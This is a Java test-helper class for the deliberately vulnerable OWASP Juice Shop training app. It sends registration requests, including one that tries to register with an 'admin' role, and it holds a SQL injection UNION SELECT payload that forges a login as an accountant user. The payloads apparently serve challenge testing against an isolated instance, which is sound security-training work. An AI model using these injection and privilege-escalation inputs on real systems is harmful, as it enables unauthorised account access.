package utilities.JuiceShop;

import org.openqa.selenium.json.Json;
import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.Map;

/** Application-specific account actions relocated from the original challenge helper. */
public final class AccountActions extends ActionContext {
    /**
     * Uses the shared per-test HTTP client and JSON serializer.
     * @param api configured application client
     * @param json shared JSON serializer
     */
    AccountActions(JuiceShopApi api, Json json) { super(api, json); }

    /**
     * Performs the register with mismatched passwords action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerWithMismatchedPasswords() throws IOException, InterruptedException {
        String email = "registration-" + System.nanoTime() + "@example.com";
        return api.post("/api/Users/", Map.of("email", email, "password", "Password123!", "passwordRepeat", "Different123!"));
    }

    /**
     * Performs the register empty user action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerEmptyUser() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "", "password", "", "passwordRepeat", ""));
    }

    /**
     * Performs the register with admin role action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerWithAdminRole() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "admin-registration-" + System.nanoTime() + "@example.com",
                "password", "Password123!", "passwordRepeat", "Password123!", "role", "admin"));
    }

    /**
     * Performs the ephemeral accountant login flow and returns the relevant credential or token.
     *
     * @return the login result associated with the ephemeral accountant challenge
     */
    public String ephemeralAccountantLogin() {
        return "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
                + "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', "
                + "'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', "
                + "'/assets/public/images/uploads/default.svg' as 'profileImage', "
                + "'' as 'totpSecret', 1 as 'isActive', "
                + "'1999-08-16 14:14:41.644 +00:00' as 'createdAt', "
                + "'1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--";
    }
}
